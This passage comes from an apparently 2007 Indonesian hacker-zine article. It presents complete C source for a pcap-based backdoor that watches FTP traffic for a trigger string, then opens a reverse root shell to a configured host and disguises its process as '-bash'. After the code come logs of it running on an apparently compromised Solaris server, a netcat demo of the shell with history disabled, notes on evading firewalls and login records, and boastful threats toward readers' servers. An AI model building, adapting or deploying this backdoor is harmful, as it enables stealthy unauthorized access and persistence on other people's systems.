+Sniffer inside this code is a modification of sniffex.c
+By : Tcpdump group (2005-07-05)
+     Tim Carstens (2002-01-07)
+http://www.tcpdump.org/sniffex.c
+
+I add connback() function, write a simple procces 
+faker inside of this code, making a daemonized
+sniffing proccess, and ripping many parts of sniffex.c
+code coz unusable for backdooring.
+
+This code works well under : 
+SunOS 5.9
+Linux 2.6.x
+OpenBSD 3.9
+
+Modification and redistribution of this code
+is allowed and all the authors are appropriately 
+credited.
+
+Kecoak Elektronik [at] 2007
+*/
+
+#include <pcap.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+//
+//Configure By Your Self
+//
+//IP to connect-back to
+#define CIP "72.xxx.xxx.xxx"
+//Port to connect-back to
+#define PORTCB 65534
+//This port will be sniffed
+#define FILTER "tcp port 21"
+//Hide Proccess
+#define FAKEPROC "-bash"
+//Data needed to connect-back
+#define r00t "MAKE-ME-ROOT-WITH-REVERSE-SHELL"
+
+//End Configuration
+
+/*maximum bytes per packet to capture*/
+#define SNAP_LEN 1518
+
+/* ethernet headers are always exactly 14 bytes [1] */
+#define SIZE_ETHERNET 14
+
+/* Ethernet addresses are 6 bytes */
+#define ETHER_ADDR_LEN  6
+
+/* Ethernet header */
+struct sniff_ethernet {
+        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
+        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
+        u_short ether_type;                     /* IP? ARP? RARP? etc */
+};
+
+/* IP header */
+struct sniff_ip {
+        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
+        u_char  ip_tos;                 /* type of service */
+        u_short ip_len;                 /* total length */
+        u_short ip_id;                  /* identification */
+        u_short ip_off;                 /* fragment offset field */
+        u_char  ip_ttl;                 /* time to live */
+        u_char  ip_p;                   /* protocol */
+        u_short ip_sum;                 /* checksum */
+};
+#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
+#define IP_V(ip)                (((ip)->ip_vhl) >> 4)
+
+/* TCP header */
+typedef u_int tcp_seq;
+
+struct sniff_tcp {
+        u_short th_sport;               /* source port */
+        u_short th_dport;               /* destination port */
+        tcp_seq th_seq;                 /* sequence number */
+        tcp_seq th_ack;                 /* acknowledgement number */
+        u_char  th_offx2;               /* data offset, rsvd */
+#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
+        u_char  th_flags;
+        u_short th_win;                 /* window */
+        u_short th_sum;                 /* checksum */
+        u_short th_urp;                 /* urgent pointer */
+};
+
+void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+void connback();
+
+void connback()
+{
+        int s,con,child;
+        struct hostent *he;
+        struct sockaddr_in address;
+
+        if((s=socket(AF_INET,SOCK_STREAM,0))<0){
+                return;
+        }
+        if((he=gethostbyname(CIP))==NULL){
+                close(s);
+        }
+        bzero((char *) &address, sizeof(address));
+        address.sin_family = AF_INET;
+        bcopy( (char *)he->h_addr,(char *)&address.sin_addr.s_addr,he->h_length);
+        address.sin_port = htons(PORTCB);
+        con=connect(s,(struct sockaddr *)&address,sizeof(address));
+        if(con<0){
+                close(s);
+        }
+        dup2(s,2);
+        dup2(s,1);
+        dup2(s,0);
+        printf("Remote reverse backdoor by someone [at] kecoak-elektronik\n");
+        system("/bin/sh -i");
+        close(s);
+        close(s);
+}
+
+void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+{
+
+        int testcount = 0;                      /* declare pointers to packet headers */
+        const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
+        const struct sniff_ip *ip;              /* The IP header */
+        const struct sniff_tcp *tcp;            /* The TCP header */
+        const char *payload;                    /* Packet payload */
+
+        int size_ip;
+        int size_tcp;
+        int size_payload;
+
+        /* define ethernet header */
+        ethernet = (struct sniff_ethernet*)(packet);
+
+        /* define/compute ip header offset */
+        ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
+        size_ip = IP_HL(ip)*4;
+        if (size_ip < 20) {
+                return;
+        }
+
+        /* define/compute tcp header offset */
+        tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
+        size_tcp = TH_OFF(tcp)*4;
+        if (size_tcp < 20) {
+                return;
+        }
+
+        /* define/compute tcp payload (segment) offset */
+        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+        if(strstr(payload,r00t)){
+               connback();
+        }
+
+return;
+}
+
+
+int main(int argc, char **argv)
+{
+
+        char *dev = NULL;                       /* capture device name */
+        char errbuf[PCAP_ERRBUF_SIZE];          /* error buffer */
+        pcap_t *handle;                         /* packet capture handle */
+        char filter_exp[] = FILTER;             /* filter expression [3] */
+        struct bpf_program fp;                  /* compiled filter program (expression) */
+        bpf_u_int32 mask;                       /* subnet mask */
+        bpf_u_int32 net;                        /* ip */
+        int PID,num_packets = 1;                        /* number of packets to capture */
+                                                               
+        /* find a capture device if not specified on command-line */
+        dev = pcap_lookupdev(errbuf);
+        if (dev == NULL) {
+                fprintf(stderr, "Couldn't find default device: %s\n",errbuf);
+                exit(EXIT_FAILURE);
+        }
+
+        /* get network number and mask associated with capture device */
+        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
+                fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
+                net = 0;
+                mask = 0;
+        }
+
+        /* print capture info */
+        printf("Device: %s\n", dev);
+        printf("Filter expression: %s\n", filter_exp);
+
+        /* open capture device */
+        handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
+        if (handle == NULL) {
+                fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+                exit(EXIT_FAILURE);
+        }
+
+        /* make sure we're capturing on an Ethernet device [2] */
+        if (pcap_datalink(handle) != DLT_EN10MB) {
+                fprintf(stderr, "%s is not an Ethernet\n", dev);
+                exit(EXIT_FAILURE);
+        }
+
+        /* compile the filter expression */
+        if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
+                fprintf(stderr, "Couldn't parse filter %s: %s\n",
+                    filter_exp, pcap_geterr(handle));
+                exit(EXIT_FAILURE);
+        }
+
+        /* apply the compiled filter */
+        if (pcap_setfilter(handle, &fp) == -1) {
+                fprintf(stderr, "Couldn't install filter %s: %s\n",
+                    filter_exp, pcap_geterr(handle));
+                exit(EXIT_FAILURE);
+        }
+
+        //Hide me
+        memset(argv[0], 0, 21);
+        strncpy(argv[0], FAKEPROC, 20);
+
+        if((PID=fork())!=0)
+        {
+                printf("Daemon is now running with PID = %d\n",PID);
+                exit(0);
+        }
+        setsid();
+        chdir("/");
+        umask(0);
+        close(0);
+
+        while(1){
+                /* now we can set our callback function */
+                pcap_loop(handle, num_packets, got_packet, NULL);
+        }
+
+        /* cleanup */
+        pcap_freecode(&fp);
+        pcap_close(handle);
+
+return 0;
+}
+
+root@Sun0wn3d>gcc -o snfrbd snfrbd.c -lc -lsocket -lnsl -lpcap
+gcc -o snfrbd snfrbd.c -lc -lsocket -lnsl -lpcap
+root@Sun0wn3d>./snfrbd
+./snfrbd
+Device: eri0
+Filter expression: tcp port 21
+Daemon is now running with PID = 23990
+root@Sun0wn3d>#BACKDOORED
+#BACKDOORED
+root@Sun0wn3d>/usr/sbin/syslogd
+/usr/sbin/syslogd
+root@Sun0wn3d>tail -5 /var/adm/messages
+tail -5 /var/adm/messages
+Oct  1 18:30:25 xxxxx.xxxxx.lv ftpd[24327]: [ID 214291 daemon.notice] 
+ FTP LOGIN REFUSED (ftp not in /etc/passwd) ( edited )
+Oct  1 23:20:11 xxxxx.xxxxx.lv sshd[24725]: [ID 800047 auth.crit] fatal: 
+ Read from socket failed: Connection reset by peer
+Oct  2 04:39:02 xxxxx.xxxxx.lv ftpd[25171]: [ID 214291 daemon.notice] 
+ FTP LOGIN REFUSED (ftp not in /etc/passwd) ( edited )
+Oct  2 14:45:04 xxxxx.xxxxx.lv ftpd[26003]: [ID 214291 daemon.notice] 
+ FTP LOGIN REFUSED (ftp not in /etc/passwd) ( edited )
+Oct  2 15:59:12 xxxxx.xxxxx.lv syslogd: line 26: unknown priority name 
+ "=info  /opt/sfw/squid/logs/SquidClamAV_Redirector.log"
+root@Sun0wn3d>#IT SEEMS OK
+#IT SEEMS OK
+root@Sun0wn3d>#FINISH
+#FINISH
+
+Backdoor semacam ini hanya saya gunakan ketika benar-benar backdoor
+lain seperti SSH trojan tidak mungkin dipasang, keuntungan mengguna
+kan backdoor semacam ini :
+
+- Bypass restriksi inbound sebuah firewall karena memanfaatkan port
+  yang memang melayani public service dan tentunya inbound ke port
+  ini di izinkan dari internet (public)
+- Tidak membuka port baru di mesin yang dibackdoor.
+- Hanya menambahkan 1 daemon baru di mesin target, berbeda jika
+  mengkombinasikan bineries backdoor dan port knocking lebih dari satu.
+- Jika anda tidak tahu cara menghilangkan proses dari tasklist semacam
+  'ps', backdoor ini sudah dilengkapi proccess faker (bekerja baik di 
+  linux n OpenBSD). Untuk di SunOS process fakernya ga jalan tuh. 
+  Use LKM OK!
+- Tidak di log di utmp, utmpx, wtmpx, maupun lastlog
+- analisis sendiri :-)
+- Download dari http://kecoak-elektronik.net/download/snfrbd.c
+
+Mungkin anda bertanya kenapa saya tidak memodifikasi daemon FTP atau
+HTTP nya saja kan malah tidak menambah daemon baru?? Jawabanya karena
+saya sama sekali tidak familiar dengan Solaris ftpd sedangkan memodifi
+kasi apache bukan pilihan bijak dilihat dari banyaknya perubahan yang
+mungkin terjadi di webserver agar PHP dan MySQL tetap running well. 
+( Mengkompile apache baru, sangat mungkin berimbas pada kompile ulang 
+PHP dan MySQL bukan? ). 
+
+OK, sekarang kita coba test backdoornya. Saya menggunakan dua box, 
+pertama (A) mesin linux saya sendiri, kedua (B) mesin linux yang saya 
+gunakan untuk menerima koneksi balik dari SunOS machine.
+
+Login ke mesin kedua (B) eksekusi netcat untuk listen di port 65534
+
+mybox~>ssh -lroot 72.xxx.xxx.xxx
+root@72.xxx.xxx.xxx's password:
+Last login: Mon Oct  1 01:52:54 2007 from 2xx.xxx.xxx.xxx
+[root@0wn3d ~]#nc -vvlp 65534
+listening on [any] 65534 ...
+
+Dari mesin pertama (A) gunakan netcat kemudian lihat kembali di 
+mesin kedua (B)
+
+mybox~>echo "MAKE-ME-ROOT-WITH-REVERSE-SHELL"|nc 212.xxx.xxx.xxx 21
+
+[root@0wn3d ~]#nc -vvlp 65534
+listening on [any] 65534 ...
+212.xxx.xxx.xxx: inverse host lookup failed: Unknown host
+connect to [72.xxx.xxx.xxx] from (UNKNOWN) [212.xxx.xxx.xxx] 50671
+# unset HISTFILE
+# uname -a
+SunOS xxxx.xxxxx.lv 5.9 Generic_112233-04 sun4u sparc SUNW,Sun-Blade-100
+# id
+uid=0(root) gid=60001(nobody)
+# w
+  4:12pm  up 22 day(s), 22:19,  0 users,  load average: 0,08, 0,04, 0,04
+User     tty           login@  idle   JCPU   PCPU  what
+# last -2
+root      pts/1        212.x.x.x     Sun Sep  9 22:01 - 22:05  (00:04)
+root      pts/1        212.x.x.x     Sun Sep  9 17:56 - 18:12  (00:16)
+#echo "BACKDOORED WELL"
+BACKDOORED WELL
+#
+
+Hmmmm, akhirnya proses backdooring selesai..., cukup lama memang
+tapi ini dikarenakan saya membackdoor sebuah box agar "sebersih"
+mungkin servernya dan juga karena topologi networknya yang mengharus
+kan saya mengcode beberapa tools secara mendadak. Hell yeah, kombinasi 
+pengetahuan sistem, network, dan programming. Proses hacking tidak 
+cukup dengan notepad dan internet explorer!
+
+
+
+--[5]-- Penutup
+
+
+We're not just making theory
+We're silent because undergrounds need to be silent
+This is just a simple disclosoure for you
+
+If we want to get in to your servers then we shall be there 
+without any single trace
+
+If we want to crash your servers then your servers will crash 
+without any explanation
+
+Learn how to love hacking or turn off your computer!
+
+
+--[6]-- Referensi
+
+(1) www.freeworld.thc.org
+(2) www.tcpdump.org
+(3) My backdooring experience
+
+
+Sarang Kecoak, 
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2007 Kecoak Elektronik Indonesia
+http://www.kecoak-elektronik.net
